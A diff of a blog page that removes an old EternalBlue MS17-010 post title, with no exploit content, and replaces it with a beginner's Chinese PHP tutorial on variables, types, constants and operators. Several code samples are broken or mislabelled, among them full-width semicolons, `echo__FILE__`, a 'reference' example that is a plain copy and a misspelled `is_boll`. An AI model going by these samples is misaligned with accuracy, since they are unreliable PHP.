@@ -11,7 +11,7 @@
   <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-  <title>永恒之蓝 MS17-010 漏洞复现 | 1in</title>
+  <title>1in</title>
 
   
     
@@ -310,14 +310,14 @@
 
 
 
-<div class="post-detail-header lazyload" id="thumbnail_canvas" data-original="/medias/8.jpg" style="background-repeat: no-repeat; background-size: cover; 
+<div class="post-detail-header lazyload" id="thumbnail_canvas" data-original="/medias/1.jpg" style="background-repeat: no-repeat; background-size: cover; 
   background-position: center center;position: relative;">
   <div class="post-detail-header-mask"></div>
   <canvas id="header_canvas"style="position:absolute;bottom:0;pointer-events:none;"></canvas>
   
   <div class="title-box">
     <span class="title">
-      永恒之蓝 MS17-010 漏洞复现
+      
     </span>
   </div>
   
@@ -334,7 +334,7 @@
       
       <div class="post-meta">
         <i class="fa fa-clock-o" aria-hidden="true"></i>
-        <span class="post-time">2021-06-16</span>
+        <span class="post-time">2021-08-05</span>
       </div>
       
       <div class="post-tags-categories">
@@ -342,32 +342,117 @@
         
       </div>
       <div class="post-content">
-        <p>﻿# 永恒之蓝 MS17-010 漏洞复现<br><font color=#999AAA ></p>
-<font color=#999AAA >
+        <p><a name="XVgT2"></a></p>
+<h1 id="一、初始PHP脚本程序"><a href="#一、初始PHP脚本程序" class="headerlink" title="一、初始PHP脚本程序"></a>一、初始PHP脚本程序</h1><p><a name="VbSgT"></a></p>
+<h2 id="1-PHP开始标记"><a href="#1-PHP开始标记" class="headerlink" title="1.PHP开始标记"></a>1.PHP开始标记</h2><p><strong>&lt;?php **<br /></strong>  2.PHP结束标记**<br />** ?&gt;**<br><a name="7G3Zz"></a></p>
+<h3 id="1-这之间就表示进入PHP模式，在开始和结束标记之外的内容都会被PHP解析器忽略。"><a href="#1-这之间就表示进入PHP模式，在开始和结束标记之外的内容都会被PHP解析器忽略。" class="headerlink" title="1).   这之间就表示进入PHP模式，在开始和结束标记之外的内容都会被PHP解析器忽略。"></a>1).   <?php ?>这之间就表示进入PHP模式，在开始和结束标记之外的内容都会被PHP解析器忽略。</h3><p><a name="dkmfg"></a></p>
+<h3 id="2-可以直接嵌入到html代码中，并且可以嵌入到html代码的任何地方，在一个html文档中可以嵌入任意多个PHP标记"><a href="#2-可以直接嵌入到html代码中，并且可以嵌入到html代码的任何地方，在一个html文档中可以嵌入任意多个PHP标记" class="headerlink" title="2).   可以直接嵌入到html代码中，并且可以嵌入到html代码的任何地方，在一个html文档中可以嵌入任意多个PHP标记"></a>2).   可以直接嵌入到html代码中，并且可以嵌入到html代码的任何地方，在一个html文档中可以嵌入任意多个PHP标记</h3><p><a name="KphlH"></a></p>
+<h3 id="3）-文件末尾的PHP代码段结束标记可以不要-在一些情况下省略更好"><a href="#3）-文件末尾的PHP代码段结束标记可以不要-在一些情况下省略更好" class="headerlink" title="3）.  文件末尾的PHP代码段结束标记可以不要  在一些情况下省略更好"></a>3）.  文件末尾的PHP代码段结束标记可以不要  在一些情况下省略更好</h3><p><a name="tjZGK"></a></p>
+<h2 id="2-指令分隔符“分号”"><a href="#2-指令分隔符“分号”" class="headerlink" title="2.指令分隔符“分号”"></a>2.指令分隔符“分号”</h2><p><a name="YU1Oy"></a></p>
+<h3 id="1-PHP语句分为两种，一种是在程序中使用结构定义语句，另外一种是在程序中使用功能执行语句，其中前者结尾不需要使用分号，后者必须使用分号结尾！"><a href="#1-PHP语句分为两种，一种是在程序中使用结构定义语句，另外一种是在程序中使用功能执行语句，其中前者结尾不需要使用分号，后者必须使用分号结尾！" class="headerlink" title="1). PHP语句分为两种，一种是在程序中使用结构定义语句，另外一种是在程序中使用功能执行语句，其中前者结尾不需要使用分号，后者必须使用分号结尾！"></a>1). PHP语句分为两种，一种是在程序中使用结构定义语句，另外一种是在程序中使用功能执行语句，其中前者结尾不需要使用分号，后者必须使用分号结尾！</h3><p><a name="CHVrU"></a></p>
+<h3 id="2-结束表示-gt-就隐含一个分号，所以PHP代码最后一行可以不用加分号！"><a href="#2-结束表示-gt-就隐含一个分号，所以PHP代码最后一行可以不用加分号！" class="headerlink" title="2). 结束表示 ?&gt; 就隐含一个分号，所以PHP代码最后一行可以不用加分号！"></a>2). 结束表示 ?&gt; 就隐含一个分号，所以PHP代码最后一行可以不用加分号！</h3><p><a name="AWssS"></a></p>
+<h2 id="附加"><a href="#附加" class="headerlink" title="附加"></a>附加</h2><p><br /><strong>注释</strong><br /><strong>1）多行注释</strong><br /><strong>/*<strong><br /></strong>   多行注释*<em><br />**/</em></strong><br /><strong>2）单行注释</strong><br /><strong>//  我是单行注释</strong><br><a name="XBssE"></a></p>
+<h1 id="二、变量"><a href="#二、变量" class="headerlink" title="二、变量"></a>二、变量</h1><p><strong>变量是用于临时（只有我们的程序在运行过程中才存在）储存值（数据）的容器</strong><br><a name="9WjrC"></a></p>
+<h3 id="1-变量的声明"><a href="#1-变量的声明" class="headerlink" title="1.变量的声明"></a>1.变量的声明</h3><pre><code>          PHP的特性之一就是它不要求在使用变量之前声明变量，当第一次给一个变量赋值时，你才创建了这个变量，变量用于存储比如数字、文本字符串或者数组。一旦设置了某个变量，我们就可以在脚本中重复地使用它。PHP中变量必须使用一个美元符号$ 后面跟着变量名来表示，使用赋值操作符（=）给一个变量赋值。
+</code></pre>
+<p><a name="WT8k2"></a></p>
+<h3 id="2-变量的释放"><a href="#2-变量的释放" class="headerlink" title="2.变量的释放"></a>2.变量的释放</h3><pre><code>            unset()函数释放指定的变量
+</code></pre>
+<p><a name="I6Qj4"></a></p>
+<h3 id="3-变量的命名"><a href="#3-变量的命名" class="headerlink" title="3.变量的命名"></a>3.变量的命名</h3><p><a name="sYoS7"></a></p>
+<h4 id="1）变量名是严格区分大小写的"><a href="#1）变量名是严格区分大小写的" class="headerlink" title="1）变量名是严格区分大小写的"></a>1）变量名是严格区分大小写的</h4><pre><code> $name&lt;br /&gt;     $NAME&lt;br /&gt;     $Name
+</code></pre>
+<p><a name="hBqzo"></a></p>
+<h4 id="2-变量名由字母或者下划线开头，后面可以跟上任意数量的字母，数字，或者下划线。"><a href="#2-变量名由字母或者下划线开头，后面可以跟上任意数量的字母，数字，或者下划线。" class="headerlink" title="2)  变量名由字母或者下划线开头，后面可以跟上任意数量的字母，数字，或者下划线。"></a>2)  变量名由字母或者下划线开头，后面可以跟上任意数量的字母，数字，或者下划线。</h4><p><strong>变量名的标示符一定不要以数字开头，中间不可以使用空格，不能使用点分开！</strong><br />**   变量名只能包含 字母  数字  下划线  并且 必须以字母或下划线开头！！！**<br />**</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$name</span>=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$name</span>;<span class="comment">//输出变量$name 的内容！</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>3）PHP中有一些标示符是系统定义的，也称为关键字，是PHP语言的组成部分，因此不能使用它们中的任何一个作为常量函数名或者类名，但是和其他语音不同的是可以在PHP中作为变量名称使用，不过这样容易混淆，所以最好还是不要用PHP的关键字作为变量名称</strong><br /><strong><img "" class="lazyload placeholder" data-original="https://cdn.nlark.com/yuque/0/2021/png/21656971/1627957172302-05e915f0-03c8-4d1b-90bd-880fe0368e83.png#align=left&display=inline&height=334&margin=%5Bobject%20Object%5D&name=image.png&originHeight=334&originWidth=564&size=155570&status=done&style=none&width=564" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image.png"></strong><br><a name="KukcF"></a></p>
+<h3 id="4-可变变量"><a href="#4-可变变量" class="headerlink" title="4.可变变量"></a>4.可变变量</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$abc</span>=<span class="string">&#x27;test&#x27;</span>;<span class="comment">//定义了一个变量$abc  里面存的值为test</span></span><br><span class="line"><span class="variable">$$abc</span>=<span class="string">&#x27;tttt&#x27;</span>; <span class="comment">//$test=&#x27;tttt&#x27;;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$test</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>   了解即可<br><a name="kdWZL"></a></p>
+<h3 id="5-变量的引用赋值"><a href="#5-变量的引用赋值" class="headerlink" title="5.变量的引用赋值"></a>5.变量的引用赋值</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="number">1000</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;<span class="comment">//输出$a也为1000  $a的值不会改变</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><a name="YzVGa"></a></p>
+<h1 id="三、变量类型"><a href="#三、变量类型" class="headerlink" title="三、变量类型"></a>三、变量类型</h1><p>概述：变量类型是指保存在该变量中的数据类型，相同类型的数据才可互相操作。<br><a name="d6FSd"></a></p>
+<h2 id="1-变量类型简介"><a href="#1-变量类型简介" class="headerlink" title="1.变量类型简介"></a>1.变量类型简介</h2><p>使用<strong>var_dump(变量名)**</strong> **可以输出变量的类型！<br><a name="hOcZy"></a></p>
+<h3 id="1）bool（布尔型）"><a href="#1）bool（布尔型）" class="headerlink" title="1）bool（布尔型）"></a>1）bool（布尔型）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="literal">true</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这个是最简单的类型，布尔型表达了true或false，即真和假<br />以下值被认为false，其他则为true<br><a name="CddEN"></a></p>
+<h4 id="1️⃣布尔值false"><a href="#1️⃣布尔值false" class="headerlink" title="1️⃣布尔值false"></a>1️⃣布尔值false</h4><p><a name="qVa8c"></a></p>
+<h4 id="2️⃣0"><a href="#2️⃣0" class="headerlink" title="2️⃣0"></a>2️⃣0</h4><p><a name="1sWCG"></a></p>
+<h4 id="3️⃣浮点型0-0"><a href="#3️⃣浮点型0-0" class="headerlink" title="3️⃣浮点型0.0"></a>3️⃣浮点型0.0</h4><p><a name="f6Ac2"></a></p>
+<h4 id="4️⃣空白字符串和字符串0-空白字符串是指没有任何内容"><a href="#4️⃣空白字符串和字符串0-空白字符串是指没有任何内容" class="headerlink" title="4️⃣空白字符串和字符串0  //空白字符串是指没有任何内容"></a>4️⃣空白字符串和字符串0  //空白字符串是指没有任何内容</h4><p><a name="Y3pWx"></a></p>
+<h4 id="5️⃣没有成员的数组"><a href="#5️⃣没有成员的数组" class="headerlink" title="5️⃣没有成员的数组"></a>5️⃣没有成员的数组</h4><p><a name="fDQbk"></a></p>
+<h4 id="6️⃣NULL"><a href="#6️⃣NULL" class="headerlink" title="6️⃣NULL"></a>6️⃣NULL</h4><p><a name="flUXT"></a></p>
+<h3 id="2）int-（整形）"><a href="#2）int-（整形）" class="headerlink" title="2）int （整形）"></a>2）int （整形）</h3><pre><code>  往变量里存储整数
+</code></pre>
+<p><a name="oIsxZ"></a></p>
+<h3 id="3）float（浮点型也称double）"><a href="#3）float（浮点型也称double）" class="headerlink" title="3）float（浮点型也称double）"></a>3）float（浮点型也称double）</h3><p>往变量里存小数<br><a name="eSzd8"></a></p>
+<h3 id="4）string（字符串）"><a href="#4）string（字符串）" class="headerlink" title="4）string（字符串）"></a>4）string（字符串）</h3><p>字符串就是一系列的字符组成串在一起<br /><strong>单引号’’包括起来的不能再包含’’   要使用反斜杠\来进行转义</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$b</span>=<span class="number">1</span>;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;textqqq\&#x27;ssd&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>双引号</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$b</span>=<span class="number">1</span>;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;te($b)xtqqq\&#x27;ssd&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>定界符</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=&lt;&lt;&lt;aaaaa</span><br><span class="line">  sdfasfsfsfffsafsfasasffsfsaasffas</span><br><span class="line">  aaaaa;</span><br><span class="line">var_dump(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><a name="SzgSv"></a></p>
+<h3 id="5-数组"><a href="#5-数组" class="headerlink" title="5)    数组"></a>5)    数组</h3><p><a name="HrJUM"></a></p>
+<h3 id="6）object（对象）"><a href="#6）object（对象）" class="headerlink" title="6）object（对象）"></a>6）object（对象）</h3><p><a name="nybVa"></a></p>
+<h3 id="7）resource（资源）"><a href="#7）resource（资源）" class="headerlink" title="7）resource（资源）"></a>7）resource（资源）</h3><p><a name="PL8NV"></a></p>
+<h3 id="8）NULL"><a href="#8）NULL" class="headerlink" title="8）NULL"></a>8）NULL</h3><pre><code>    null表示一个变量没有值，表示空&lt;br /&gt;          将变量直接赋值为null&lt;br /&gt;         声明的变量就是尚未被赋值&lt;br /&gt;         被unset（）函数销毁的变量
+</code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="number">1111</span>;</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$a</span>);</span><br><span class="line">var_dump(<span class="variable">$a</span>);</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><a name="BmM41"></a></p>
+<h2 id="2-变量类型的相互转换"><a href="#2-变量类型的相互转换" class="headerlink" title="2.变量类型的相互转换"></a>2.变量类型的相互转换</h2><p><a name="xeu9P"></a></p>
+<h3 id="1）自动类型转换"><a href="#1）自动类型转换" class="headerlink" title="1）自动类型转换"></a>1）自动类型转换</h3><p>有布尔值参与运算时，true将转化为整数1，false将转化为整数0<br />    有null值参与运算时，null值将转化为整数0再进行运算<br />    有int型和float型数据参与运算时，先把int转变为float型后再进行运算<br />    有字符串和数字型（int或者float）参与运算时的情况<br><a name="X1XsA"></a></p>
+<h3 id="2）强制类型转换"><a href="#2）强制类型转换" class="headerlink" title="2）强制类型转换"></a>2）强制类型转换</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;7qwe&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>=(<span class="keyword">int</span>)<span class="variable">$a</span>;</span><br><span class="line">var_dump(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>不要给自己挖坑！！！</strong><br><a name="HKFfd"></a></p>
+<h3 id="3）变量类型的测试函数"><a href="#3）变量类型的测试函数" class="headerlink" title="3）变量类型的测试函数"></a>3）变量类型的测试函数</h3><p>**  is_boll()<strong><br /></strong>     is_int(()<strong><br /></strong>     is_array()  等等。。。。**<br><a name="UKXMx"></a></p>
+<h1 id="四、常量"><a href="#四、常量" class="headerlink" title="四、常量"></a>四、常量</h1><p><a name="jUd99"></a></p>
+<h2 id="1-概念"><a href="#1-概念" class="headerlink" title="1.概念"></a>1.概念</h2><p><strong>常量是用于临时（只有我们的程序在运行过程中才存在）储存值（数据）的容器</strong><br><a name="RAWjm"></a></p>
+<h2 id="2-定义和使用"><a href="#2-定义和使用" class="headerlink" title="2.定义和使用"></a>2.定义和使用</h2><p><strong>define(常量名称，常量值)</strong><br /><strong>常量的命名与变量类似，也遵循PHP标识符的名称规则，按照惯例常量标识符总是大写的</strong><br /><strong>define（’MY_NAME’,’哈哈’）</strong><br /><strong>defined()函数来检查是否定义了某个常量</strong><br /><strong>自己定义的常量是严格区分大小写的！</strong><br><a name="uUkqe"></a></p>
+<h2 id="3-常量和变量的区别"><a href="#3-常量和变量的区别" class="headerlink" title="3.常量和变量的区别"></a>3.常量和变量的区别</h2><pre><code>1）常量前面没有美元符号$&lt;br /&gt;    2) 常量只能用define（）函数定义， 不能通过赋值语句&lt;br /&gt;    3） 常量可以不用理会变量范围的规则而在任何地方定义和使用&lt;br /&gt;    4) 常量一旦被定义 就不能被重新定义和取消定义&lt;br /&gt;    5） 常量的值只能是bool，int，float，string类型
+</code></pre>
+<p><a name="DDHKD"></a></p>
+<h2 id="4-预定义常量"><a href="#4-预定义常量" class="headerlink" title="4.预定义常量"></a>4.预定义常量</h2><pre><code>  预定义常量就是PHP内核帮我们定义好的常量&lt;br /&gt;其中有的预定义常量是以____开头的，这些常量我们又叫它**魔术常量**
+</code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;EDG&#x27;</span>；</span><br><span class="line"> define(<span class="string">&#x27;MY_NAME&#x27;</span>,<span class="string">&#x27;EDG&#x27;</span>);</span><br><span class="line">echo__FILE__;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>预定义常量是不区分大小写的！<br><a name="vjtCI"></a></p>
+<h1 id="五、运算符"><a href="#五、运算符" class="headerlink" title="五、运算符"></a>五、运算符</h1><p><a name="oIAmU"></a></p>
+<h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1.概述"></a>1.概述</h2><pre><code>     **说白了就是一些符号！！！****这些符号可以将变量或者数据执行某种运算！**&lt;br /&gt;**举例:**&lt;br /&gt;**      !true  **&lt;br /&gt;**        !是运算符  true是操作数**&lt;br /&gt;**      $a+$b**&lt;br /&gt;**           =是运算符  $a,$b是操作数**&lt;br /&gt;**       true？1：0  **&lt;br /&gt;**             ?和  ：是运算符     true 和1 0 是操作数**&lt;br /&gt;** ****根据操作数个数分为  一元运算符，二元运算符，三元运算符**&lt;br /&gt;**
+</code></pre>
+<p><a name="iEzYI"></a></p>
+<h2 id="2-算数运算符"><a href="#2-算数运算符" class="headerlink" title="2.算数运算符"></a>2.算数运算符</h2><p><img "" class="lazyload placeholder" data-original="https://cdn.nlark.com/yuque/0/2021/png/21656971/1628040506138-a762a774-d89d-467f-a2c3-d55a3285cb85.png#align=left&display=inline&height=376&margin=%5Bobject%20Object%5D&name=image.png&originHeight=376&originWidth=714&size=118819&status=done&style=none&width=714" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image.png"><br><a name="1kX3E"></a></p>
+<h2 id="3-字符串运算符"><a href="#3-字符串运算符" class="headerlink" title="3.字符串运算符"></a>3.字符串运算符</h2><p>PHP中的字符串运算符<strong>只有一个英文的句号.</strong>       也叫<strong>连接运算符</strong><br />**</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;孙胜利&#x27;</span>；</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;YYDS&#x27;</span>；</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>.<span class="variable">$b</span>;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><a name="oWhS3"></a></p>
+<h2 id="4-赋值运算符"><a href="#4-赋值运算符" class="headerlink" title="4.赋值运算符"></a>4.赋值运算符</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="number">1</span>;<span class="comment">//$a=1+1;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>左边的操作数必须是变量，右边可以是一个表达式，也可以是一个值，一个变量等等！！！！</strong><br /><strong>作用：  将右边表达式的值赋给左边变量</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="number">2</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="number">1</span>;</span><br><span class="line"><span class="variable">$a</span>-=<span class="variable">$b</span>;<span class="comment">//$a=$a-$b;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><a name="nVg8x"></a></p>
+<h2 id="5-比较运算符"><a href="#5-比较运算符" class="headerlink" title="5.比较运算符"></a>5.比较运算符</h2><p><strong>对操作数（按照比较运算符的要求，规则）进行比较</strong><br />   如果比较出的结果满足比较运算符的结果 就为true 否则为false<br /><img "" class="lazyload placeholder" data-original="https://cdn.nlark.com/yuque/0/2021/png/21656971/1628042379078-ad9a9519-63d8-4611-9c55-4841e5546f1f.png#align=left&display=inline&height=301&margin=%5Bobject%20Object%5D&name=image.png&originHeight=301&originWidth=247&size=32907&status=done&style=none&width=247" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image.png"><strong>==数值相等！===类型值都相等</strong><br /><strong>PHP中规定：  使用echo输出布尔类型值的时候</strong><br />**                        echo  true；它在界面中会输出1；**<br /><strong><br />**如果需要输出布尔类型值的时候我们最好使用var_dump()来输出更精确的结果！</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="number">1</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="number">1</span>;</span><br><span class="line">var_dump(<span class="variable">$a</span>==<span class="variable">$b</span>);<span class="comment">//true</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="number">11</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;11&#x27;</span>;</span><br><span class="line">var_dump(<span class="variable">$a</span>==<span class="variable">$b</span>);<span class="comment">//字符串会转化为整数  true！！  </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="number">11</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;11&#x27;</span>;</span><br><span class="line">var_dump(<span class="variable">$a</span>===<span class="variable">$b</span>);<span class="comment">//false!!!! </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><a name="IrbNF"></a></p>
+<h3 id="6-逻辑运算符"><a href="#6-逻辑运算符" class="headerlink" title="6.逻辑运算符"></a>6.逻辑运算符</h3><p><img "" class="lazyload placeholder" data-original="https://cdn.nlark.com/yuque/0/2021/png/21656971/1628043050807-87498d3d-0041-41a7-997d-54c499aa81fe.png#align=left&display=inline&height=216&margin=%5Bobject%20Object%5D&name=image.png&originHeight=216&originWidth=304&size=34237&status=done&style=none&width=304" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image.png"><br />  对表达式进行逻辑运算，运算出的结果是布尔类型的值（true，false）<br />** 要求：**<br />**          参与逻辑运算的表达式的值是布尔类型的值，如果不是布尔类型的值会被PHP自动转换成布尔类型的值，然后再参与运算**</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="literal">true</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="literal">true</span>;</span><br><span class="line">var_dump (<span class="variable">$a</span> &amp;&amp; <span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><a name="rnmXx"></a></p>
+<h3 id="7-位运算符"><a href="#7-位运算符" class="headerlink" title="7.位运算符"></a>7.位运算符</h3><pre><code>         位运算符用于对操作数中的每一个二进制数进行位运算，由于PHP主要用于网站开发方面，所以位运算符在PHP中使用较少
+</code></pre>
+<p><a name="w4ArV"></a></p>
+<h3 id="8-其他运算符"><a href="#8-其他运算符" class="headerlink" title="8.其他运算符"></a>8.其他运算符</h3><p><a name="tbKmh"></a></p>
+<h4 id="1）？：三元运算符"><a href="#1）？：三元运算符" class="headerlink" title="1）？：三元运算符"></a>1）？：三元运算符</h4><p>** 表达式1 ？表达式2 : 表达式3**<br />如果表达式1的值为true，那么就执行表达式2，否则就执行表达式3</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="literal">true</span> ? <span class="number">10</span> : <span class="number">20</span>;<span class="comment">//  10</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><a name="fQIYM"></a></p>
+<h4 id="2-把系统的命令放在里面执行"><a href="#2-把系统的命令放在里面执行" class="headerlink" title="2)``   把系统的命令放在里面执行"></a>2)``   把系统的命令放在里面执行</h4><p><a name="qulgj"></a></p>
+<h4 id=""><a href="#" class="headerlink" title=""></a></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=`ipconfig`;</span><br><span class="line">var_dump(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code>                        **涉及跨平台问题！！不常用！！！**
+</code></pre>
+<p><a name="4c1zt"></a></p>
+<h4 id="3）-屏蔽表达式可能发生的错误"><a href="#3）-屏蔽表达式可能发生的错误" class="headerlink" title="3）@  屏蔽表达式可能发生的错误"></a>3）@  屏蔽表达式可能发生的错误</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> @<span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><a name="Y5kFZ"></a></p>
